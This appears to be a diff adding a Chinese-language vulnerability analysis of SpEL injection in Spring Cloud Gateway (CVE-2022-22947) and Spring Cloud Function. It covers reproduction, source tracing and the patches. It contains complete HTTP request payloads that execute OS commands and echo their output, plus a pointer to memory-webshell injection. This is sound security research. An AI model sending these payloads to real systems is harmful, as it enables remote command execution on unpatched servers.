@@ -471,3 +471,206 @@ function connect() {
 用`SimpleEvaluationContext`来替代了`StandardEvaluationContext`，也就是采用了SpEL表达式注入漏洞的通用防御方法。
 
 ## CVE-2022-22947
+
+>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。
+
+### 影响版本
+
+- Spring Cloud Gateway 3.0.6-3.1.0
+
+### 漏洞复现
+
+```
+git clone https://github.com/spring-cloud/spring-cloud-gateway
+cd spring-cloud-gateway
+git checkout v3.1.0
+```
+
+运行Module `spring-cloud-gateway-sample`
+
+ 发送POST请求创建路由
+
+```http
+POST /actuator/gateway/routes/theoyu HTTP/1.1
+Host: ty.com:8081
+Content-Length: 327
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://127.0.0.1:8081
+Content-Type: application/json
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+{
+  "id": "theoyu",
+  "filters": [{
+    "name": "AddResponseHeader",
+    "args": {
+      "name": "Result",
+      "value": "#{T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")}"
+    }
+  }],
+  "uri": "http://example.com"
+}
+```
+
+发送POST请求刷新路由缓存，触发Spel注入漏洞
+
+```http
+POST /actuator/gateway/refresh HTTP/1.1
+Host: ty.com:8081
+Content-Length: 0
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://ty.com:8081
+Content-Type: application/json
+
+```
+
+![image-20220327155827967](../../assets/images/image-20220327155827967.png)
+
+### 漏洞分析
+
+先看看官网对Spring Cloud Gateway 的描述：
+
+![image-20220327174910253](../../assets/images/image-20220327174910253.png)
+
+>Clients make requests to Spring Cloud Gateway. If the Gateway Handler Mapping determines that a request matches a route, it is sent to the Gateway Web Handler. This handler runs the request through a filter chain that is specific to the request. The reason the filters are divided by the dotted line is that filters can run logic both before and after the proxy request is sent. All “pre” filter logic is executed. Then the proxy request is made. After the proxy request is made, the “post” filter logic is run.
+
+客户端发起请求给网关，网关处理映射找到一个匹配的路由，然后发送该给网关的Web处理器。处理器会通过一条特定的Filter链来处理请求，最后会发出代理请求，Filter 不仅仅做出预过滤，代理请求发出后也会进行过滤。
+
+那这个网关允许哪些操作呢？
+
+| ID              | HTTP Method | Description                                                  |
+| :-------------- | :---------- | :----------------------------------------------------------- |
+| `globalfilters` | GET         | Displays the list of global filters applied to the routes.   |
+| `routefilters`  | GET         | Displays the list of `GatewayFilter` factories applied to a particular route. |
+| `refresh`       | POST        | Clears the routes cache.                                     |
+| `routes`        | GET         | Displays the list of routes defined in the gateway.          |
+| `routes/{id}`   | GET         | Displays information about a particular route.               |
+| `routes/{id}`   | POST        | Adds a new route to the gateway.                             |
+| `routes/{id}`   | DELETE      | Removes an existing route from the gateway.                  |
+
+以上的每个执行点都是以`/actuator/gateway`为基础。
+
+我们看看如何创建一个路由：
+
+>To create a route, make a `POST` request to `/gateway/routes/{id_route_to_create}` with a JSON body that specifies the fields of the route (**see Retrieving Information about a Particular Route**)
+
+官方提示我们根据检索路由的返回信息来创建：
+
+![image-20220327185747844](../../assets/images/image-20220327185747844.png)
+
+从之前来看，**filter** 是最重要的，但官网文档并没有给出实例，不过也不重要，根据之前的poc和触发点，我们大概可以明白以下两点：
+
+- Source为**AddResponseHeader**型的filter
+- Sink为Spel中的 **StandardEvaluationContext**
+
+现在我们回到源码，尝试把这两点联系起来。
+
+全局搜索**StandardEvaluationContext**，可以定位到`org.springframework.cloud.gateway.support#ShortcutConfigurable$getValue`，下个断点看一看：
+
+![image-20220327200613883](../../assets/images/image-20220327200613883.png)
+
+那么触发点的确没问题，至于怎么和**AddResponseHeader**联系起来，其实只是一个很简单的继承关系。
+
+>**AddResponseHeaderGatewayFilterFactory** 的 **apply** 方法中的**NameValueConfig**继承于 **AbstractNameValueGatewayFilterFactory**
+>
+>**AbstractNameValueGatewayFilterFactory** 继承于 **AbstractGatewayFilterFactory**
+>
+>**AbstractGatewayFilterFactory** 实现了 **GatewayFilterFactory** 接口
+>
+>**GatewayFilterFactory** 接口继承于 **ShortcutConfigurable**
+
+那Source是否只有`AddResponseHeader`呢？其实并不是，继承了**AbstractNameValueGatewayFilterFactory**的类大多都含有**NameValueConfig**方法，其**getValue**才是真正的source点。
+
+![E815063F-A593-46BD-AC12-1F24B6FA9348](../../assets/images/E815063F-A593-46BD-AC12-1F24B6FA9348.png)
+
+这里我们选择`AddRequestHeader`做测试：
+
+![image-20220327210700571](../../assets/images/image-20220327210700571.png)
+
+### 构造回显
+
+我们知道如果Spel表达式注入想要直接回显，那么需要一个返回一个表达式计算结果，比如**Error Page**表达式注入就是这种类型，但在**Spring Cloud Gateway**中就巧在了**AddResponseHeaderGatewayFilterFactory**会把Spel表达式计算的结果放入Response中，之后可以利用GET请求拿到结果。
+
+```json
+{
+  "id": "theoyu",
+  "filters": [{
+    "name": "AddResponseHeader",
+    "args": {
+      "name": "Result",
+      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+    }
+  }],
+  "uri": "http://example.com"
+}
+```
+
+![image-20220327223323640](../../assets/images/image-20220327223323640.png)
+
+### 注入内存木马
+
+C0ny1师傅在[文章](https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/)中提到利用该漏洞注入Netty型以及Spring型内存木马，Netty不太了解，有机会可以学习一下。
+
+## Spring Cloud Function
+
+~~躺在床上刷会Twitter，忽然瞅见了有师傅发截图，还是爬起来尝试复现一下～~~
+
+>Spring Cloud Function 是Spring cloud中的serverless框架 ，其`RoutingFunction` 类的 apply 方法将请求头中的`spring.cloud.function.routing-expression`参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。
+
+### 影响版本
+
+3.0.0.RELEASE~3.2.2
+
+并且`application.properties`中配置
+
+```
+spring.cloud.function.definition=functionRouter
+```
+
+###  漏洞复现
+
+在pom中使用`3.2.1`版本的spring-cloud-function，样例采用官方[function-sample-pojo](https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo)，修改application.properties，加上`spring.cloud.function.definition:functionRouter`。
+
+启动springboot后，发送post请求：
+
+```http
+POST / HTTP/1.1
+Host: ty.com:8081
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("open -a Calculator")
+Upgrade-Insecure-Requests: 1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+xxx
+```
+
+![ban](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014709.png)
+
+### 漏洞分析
+
+从[官方补丁](https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f#diff-01d5affef57305a3034bfb48185f34ae3d21f15e7f389851ac67035f7bd0dc7a)我们可以看到，漏洞的源头位于`org/springframework/cloud/function/context/config/RoutingFunction.java `的`apply()`方法。
+
+那是从何定位到`RoutingFunction`的呢？从调用栈分析，正是我们的配置文件`spring.cloud.function.definition:functionRouter`所决定。
+
+![image-20220327010606797](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014641.png)
+
+回到`apply()`方法，这里把input类型转化为Message，其中含有http请求的请求头信息。
+
+![image-20220327012244218](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014640.png)
+
+进入到if语句，从请求头中获取了`spring.cloud.function.routing-expression`的值 ，跟进`functionFromExpression()`:
+
+![image-20220327013244138](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014656.png)
+
+expression表达式采用`StandardEvaluationContext`类型的Context，导致了Spel表达式注入漏洞。
+
+### 漏洞修复
+
+在官方patch中，对从请求头获取的`spring.cloud.function.routing-expression`添加了`true`参数，在`functionFromExpression()`判断是否从请求头获取，是则使用`SimpleEvaluationContext`类型Contex处理。
+
+![image-20220327014145343](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014659.png)
